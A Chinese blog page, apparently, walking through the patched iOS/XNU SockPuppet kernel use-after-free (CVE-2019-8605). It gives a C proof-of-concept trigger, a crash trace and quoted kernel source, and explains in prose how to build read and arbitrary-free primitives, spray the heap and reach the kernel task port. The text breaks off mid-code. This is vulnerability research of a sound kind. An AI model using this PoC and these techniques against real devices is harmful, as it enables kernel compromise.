<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>Apple 已通过<a target="_blank" rel="noopener" href="https://support.apple.com/en-us/HT213183">macOS Monterey 12.3 安全更新</a>解决了 CVE-2022-22639 问题。这个补丁现在在第 9 行添加了验证代码。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper16.png" alt="图 16. CVE-2022-22639 补丁"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">iOS-SockPuppet漏洞利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-05 14:25:50" itemprop="dateCreated datePublished" datetime="2022-04-05T14:25:50+08:00">2022-04-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-03 16:13:52" itemprop="dateModified" datetime="2022-05-03T16:13:52+08:00">2022-05-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞编号为CVE-2019-8605，在iOS 12.3中进行了修复，但是在12.4又被利用了，随后在iOS 12.4.1中进行了修复。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html</a></p>
<p>原理讲解视频：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=YV3jewkUJ54">https://www.youtube.com/watch?v=YV3jewkUJ54</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>此问题最早在2013年受到XNU的影响，并于2019年3月报告给Apple。然后在2019年5月在iOS 12.3中进行了修补（参考链接：<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806">https://bugs.chromium.org/p/project-zero/issues/detail?id=1806</a> 了完整的详细信息，包括iOS的漏洞分析，名为<code>SockPuppet</code>）。 2019年7月，然后发现此问题在iOS 12.4中也存在，后来在2019年8月下旬在iOS 12.4.1中进行了修补。</p>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>如何写一个 fuzz：</p>
<ol>
<li>先收集目标以往的漏洞；</li>
<li>在源代码中，找到漏洞对应的位置；</li>
<li>选择某一组件，该组件包含多个已公开漏洞；</li>
<li>编写fuzz；</li>
<li>fuzz该组件；</li>
<li>如果fuzz能够找到以前的漏洞，则它可能会发现新的漏洞；</li>
<li>当每次发现一个新的漏洞后，需要采取一定的措施，以防止再被命中。</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/677764/">https://lwn.net/Articles/677764/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md</a></p>
</blockquote>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    connect(s, (<span class="type">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    close(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>崩溃后的栈跟踪情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 0x497a3d in free _asan_rtl_:3</span></span><br><span class="line"><span class="comment">#1 0x7f8bbe5f42cd in in6_pcbdetach /src/bsd/netinet6/in6_pcb.c:681:3</span></span><br><span class="line"><span class="comment">#2 0x7f8bbe6b06d0 in rip6_detach /src/bsd/netinet6/raw_ip6.c:829:2</span></span><br><span class="line"><span class="comment">#3 0x7f8bbe6af680 in rip6_abort /src/bsd/netinet6/raw_ip6.c:837:9</span></span><br><span class="line"><span class="comment">#4 0x7f8bbe6b0795 in rip6_disconnect /src/bsd/netinet6/raw_ip6.c:848:9</span></span><br><span class="line"><span class="comment">#5 0x7f8bbe10132f in sodisconnectlocked /src/bsd/kern/uipc_socket.c:1792:10</span></span><br><span class="line"><span class="comment">#6 0x7f8bbe1028dc in soconnectlock /src/bsd/kern/uipc_socket.c:1664:15</span></span><br><span class="line"><span class="comment">#7 0x7f8bbe133e00 in connectit /src/bsd/kern/uipc_syscalls.c:954:10</span></span><br><span class="line"><span class="comment">#8 0x7f8bbe133b25 in connect_nocancel /src/bsd/kern/uipc_syscalls.c:726:10</span></span><br><span class="line"><span class="comment">#9 0x7f8bbe6f22b4 in connect_wrapper /src/fuzzing/syscall_stubs.c:125:7</span></span><br></pre></td></tr></table></figure>

<p>崩溃实际是发生在free函数上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">in6_pcbdetach</span><span class="params">(<span class="keyword">struct</span> inpcb *inp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">                inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        m_freem(inp-&gt;in6p_options);</span><br><span class="line">                        inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line">                ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad, dangling pointer</span></span><br><span class="line">                ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">                <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        (<span class="type">void</span>) m_free(inp-&gt;inp_options);</span><br><span class="line">                        inp-&gt;inp_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>问题出现在对<code>ip6_freepcbopts</code>的调用上，在这里，开发者原本的意图是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于<code>in6p_outputopts</code>是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数</p>
<p><code>ip6_freepcbopts</code>释放的，该函数不知道<code>inp</code>的地址，所以不能清除<code>&amp;inp-&gt;in6p_outputopts</code>，这段代码忽略了这一点。</p>
<p>释放的缓冲区是由<code>setsockopt</code>创建的，意味着我们可以通过<code>getsockopt</code>和<code>setsockopt</code>来继续访问释放的缓冲区，分别代表着读取和写入原语。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞原语"><a href="#漏洞原语" class="headerlink" title="漏洞原语"></a>漏洞原语</h2><p>在有PAC的iOS上，漏洞利用会更加麻烦一些，需要使用一个漏洞来获取内核读写，而代码执行需要别的利用方式。</p>
<p>一个进程在内核中表示两次：一个作为Mach任务，一个作为BSD proc。</p>
<p>包含悬空指针的<code>inp6_outputopts</code>的<code>inpcb</code>：</p>
<p><img src="https://img.4hou.com/uploads/ueditor/php/upload/image/20200114/1578996014165070.png" alt="Project Zero对 iOS 12.4 内核任意地址读写漏洞的深度分析（CVE-2019-8605）"></p>
<p>通过<code>[get/set]sockopt</code>查看这些选项的<code>getter</code>和<code>setter</code>，获取<code>minmtu</code>和<code>prefer_tempaddr</code>字段的整数是很直接的，可以让我们直接从释放的缓冲区中读取数据。如果我们能够回收<code>in6po_pktinfo</code>指针，我们可以自由读取20个字节。</p>
<p><code>ip6_getpcbopt</code>实现片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IPV6_PKTINFO:</span><br><span class="line">    <span class="keyword">if</span> (pktopt &amp;&amp; pktopt-&gt;ip6po_pktinfo)</span><br><span class="line">        optdata = (<span class="type">void</span> *)pktopt-&gt;ip6po_pktinfo;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">XXX:</span> we don&#x27;t have to do this every time... */</span></span><br><span class="line">        bzero(&amp;null_pktinfo, <span class="keyword">sizeof</span> (null_pktinfo));</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;null_pktinfo;</span><br><span class="line">    &#125;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="keyword">struct</span> in6_pktinfo); <span class="comment">// 20 bytes</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_USE_MIN_MTU:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_minmtu;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defminmtu;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPV6_PREFER_TEMPADDR:</span><br><span class="line">    <span class="keyword">if</span> (pktopt)</span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;pktopt-&gt;ip6po_prefer_tempaddr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optdata = (<span class="type">void</span> *)&amp;defpreftemp;</span><br><span class="line">    optdatalen = <span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p><code>ip6po_minmtu</code>和<code>ip6po_prefer_tempaddr</code>在内存中相邻，且按照<code>qword</code>对齐，所以，如果能够使用其他包含指针的对象回收这块内存，就能够读出指针并绕过ASLR。还可以利用这些字段来进行堆喷，我们在<code>in6po_pktinfo</code>字段和<code>mintmu</code>字段中的<code>magic</code>重合的位置喷出包含我们选择的任意指针值的对象。这样我们就可以反复读出<code>minmtu</code>字段，所以如果看到我们的<code>magic</code>，我们就知道在<code>in6po_pktinfo</code>中取消引用指针是安全的。一般来说，读取<code>inp6_outputopts</code>是安全的，因为我们知道它已经被映射了，但是<code>in6po_pktinfo</code>就不安全了，因为它可能已经被其他垃圾回收了，指向未映射或不可读的内存。</p>
<p>不幸的是，<code>setsockopt</code>路径不像<code>getsockopt</code>路径那样容易使用。大多数相关的选项都是只针对root的，或者是高度受限的。这使得<code>IPV6_2292PKTINFO</code>&#x2F;<code>IPV6_PKTINFO</code>仍然是最好的选项，但在测试和阅读代码时，除了高度约束的值之外，似乎无法在那里写任何东西。<code>ipi6_addr</code>字段，看起来很适合写任意数据，但必须设置为0，才能通过未指定的检查。而接口索引必须是有效的，这就约束了我们的低值。如果接口为0，就可以释放选项。这意味着我们只能在内存的任何地方写入16个空字节加上一个非零的4字节小整数。这对于开发来说当然足够了，但是释放的情况呢？只要你传入一个包含20个空字节的<code>pktinfo</code>结构，<code>ip6_setpktopt</code>就会帮你调用<code>ip6_clearpktopts</code>，最后调用<code>free(pktopt-&gt;ip6po_pktinfo, M_IP6OPT)</code>。记住，<code>in6po_pktinfo</code>是我们的受控指针，所以这意味着我们有一个任意的free。更妙的是，我们可以在不知道其区域的情况下释放任何对象。这是因为<code>free</code>是<code>kfree_addr</code>的封装器，它代表你查找zone。为了保持后期开发的通用性，我选择了任意<code>free</code>原语，而不是约束的写原语。</p>
<h2 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h2><p>利用<code>IOSurface</code>进行堆喷。</p>
<h2 id="tfp0"><a href="#tfp0" class="headerlink" title="tfp0"></a>tfp0</h2><p>这是<code>task_for_pid</code>的缩写，它会向你返回一个Mach端口，并带有给定pid的任务的发送权。当使用<code>pid=0</code>来调用它时，将返回一个内核任务端口。</p>
<blockquote>
<p>端口类似一个描述消息队列的文件描述符，内核中每个此类消息队列都有一个接收者，和一个或多个发送者。对于一个给定的端口名，可以根据访问该队列的权限来向该队列发送或接收Mach消息。</p>
<p>如果我们具有任务端口的发送权，就可以利用mach_vm_allocate，mach_vm_deallocate，mach_vm_protect和mach_vm_read_overwrite之类的函数，来读取、写入和分配内存。</p>
</blockquote>
<p>为了更好地模拟tfp0调用，先看一个消息传递的例子，消息头结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>    msgh_bits; <span class="comment">// &quot;disposition&quot;, e.g. MACH_MSG_TYPE_COPY_SEND</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>    msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_remote_port; <span class="comment">// destination port name</span></span><br><span class="line">  <span class="type">mach_port_t</span>        msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>   msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>      msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>

<p>上面有两个重要的字段，<code>msgh_remote_port </code>包含目标端口名称，如果我们可以访问它，它将是内核任务端口的名称；<code>msgh_bits</code>指定了多个标志，其中之一是对我们发送的不同端口名称的消息的属性。</p>
<p>当我们想从用户区发送消息时，我们需要一个mach陷阱，它相当于系统调用，称为<code>mach_msg_overwrite_trap</code>，<code>MACH_SEND_MSG</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">mach_msg_overwrite_trap</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> mach_msg_overwrite_trap_args* args)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="type">mach_msg_return_t</span> mr = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">vm_map_t</span> <span class="built_in">map</span> = current_map();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">    <span class="type">ipc_space_t</span> space = current_space();</span><br><span class="line">    <span class="type">ipc_kmsg_t</span> kmsg;</span><br><span class="line"></span><br><span class="line">    mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_copyin(kmsg, space, <span class="built_in">map</span>, override, &amp;option);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    mr = ipc_kmsg_send(kmsg, option, msg_timeout);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>如果要把消息传递到内核任务端口，需要了解<code>ipc_kmsg_get</code>，<code>ipc_kmsg_copyin</code>和<code>ipc_kmsg_send</code>的工作方式。<code>ipc_kmsg_get</code>将消息从调用任务的地址空间复制到内核中；<code>ipc_kmsg_copyin</code>通过调用<code>ipc_kmsg_copyin_header</code>获取消息头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_copyin_header</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_priority_t</span> override,</span></span><br><span class="line"><span class="params">                                         <span class="type">mach_msg_option_t</span> *optionp)</span> &#123;</span><br><span class="line">  <span class="type">mach_msg_header_t</span> *msg = kmsg-&gt;ikm_header;</span><br><span class="line">  <span class="type">mach_msg_bits_t</span> mbits = msg-&gt;msgh_bits &amp; MACH_MSGH_BITS_USER;</span><br><span class="line">  <span class="type">mach_port_name_t</span> dest_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_remote_port);</span><br><span class="line">  <span class="type">mach_port_name_t</span> reply_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_local_port);</span><br><span class="line"></span><br><span class="line">  <span class="type">mach_msg_type_name_t</span> dest_type = MACH_MSGH_BITS_REMOTE(mbits);</span><br><span class="line">  <span class="type">ipc_object_t</span> dest_port = IO_NULL;</span><br><span class="line">  <span class="type">ipc_port_t</span> dest_soright = IP_NULL;</span><br><span class="line">  <span class="type">ipc_entry_t</span> dest_entry = IE_NULL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dest_name != reply_name) &#123;</span><br><span class="line">    <span class="comment">// nedwill: this converts name to ipc_entry_t</span></span><br><span class="line">    dest_entry = ipc_entry_lookup(space, dest_name);</span><br><span class="line">    <span class="keyword">if</span> (dest_entry == IE_NULL) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nedwill: this converts ipc_entry_t to ipc_port_t (and checks capability)</span></span><br><span class="line">    kr = ipc_right_copyin(space, dest_name, dest_entry, dest_type, FALSE,</span><br><span class="line">                          &amp;dest_port, &amp;dest_soright, &amp;release_port, &amp;assertcnt);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">      <span class="keyword">goto</span> invalid_dest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  msg-&gt;msgh_bits =</span><br><span class="line">      MACH_MSGH_BITS_SET(dest_type, reply_type, voucher_type, mbits);</span><br><span class="line">  msg-&gt;msgh_remote_port = (<span class="type">ipc_port_t</span>)dest_port;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ipc_kmsg_copyin_header</code>用于将远程端口名称转换为端口对象，更新<code>msg-&gt; msgh_remote_port</code>指向实际对象，而不是存储特定于任务的名称。消息头有几个名称字段，我们希望<code>kernel_task</code>端口是我们的目标端口。<code>ipc_space_t space</code>参数表示当前正在运行的任务的IPC空间，相当于文件描述符表。首先，我们在IPC空间中查找<code>dest_name</code>，得到代表它的<code>ipc_entry_t</code>。每个<code>ipc_entry_t</code>都有一个叫做<code>ie_bits</code>的字段，它包含了我们的任务与相关端口交互的权限。下面是IPC入口结构的样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> *<span class="title">ie_object</span>;</span> <span class="comment">// pointer to the ipc_port_t</span></span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> ie_bits; <span class="comment">// our rights (receive/send/send-once/etc.)</span></span><br><span class="line">  <span class="type">mach_port_index_t</span> ie_index;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们发送的消息头有一个<code>disposition</code>的目的地，它描述了我们希望我们的消息用远程端口名的能力做什么。这里是实际验证和使用的地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> <span class="title function_">ipc_right_copyin</span><span class="params">(<span class="type">ipc_space_t</span> space, <span class="type">mach_port_name_t</span> name,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_entry_t</span> entry,</span></span><br><span class="line"><span class="params">                               <span class="type">mach_msg_type_name_t</span> msgt_name, <span class="type">boolean_t</span> deadok,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_object_t</span> *objectp, <span class="type">ipc_port_t</span> *sorightp,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_port_t</span> *releasep, <span class="type">int</span> *assertcntp)</span> &#123;</span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> bits;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">  *releasep = IP_NULL;</span><br><span class="line">  *assertcntp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  bits = entry-&gt;ie_bits;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (msgt_name) &#123;</span><br><span class="line">    <span class="keyword">case</span> MACH_MSG_TYPE_COPY_SEND: &#123;</span><br><span class="line">      <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_DEAD_NAME) <span class="keyword">goto</span> copy_dead;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* allow for dead send-once rights */</span></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) == <span class="number">0</span>) <span class="keyword">goto</span> invalid_right;</span><br><span class="line"></span><br><span class="line">      port = (<span class="type">ipc_port_t</span>)entry-&gt;ie_object;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND) == <span class="number">0</span>) &#123;</span><br><span class="line">        assert(IE_BITS_TYPE(bits) == MACH_PORT_TYPE_SEND_ONCE);</span><br><span 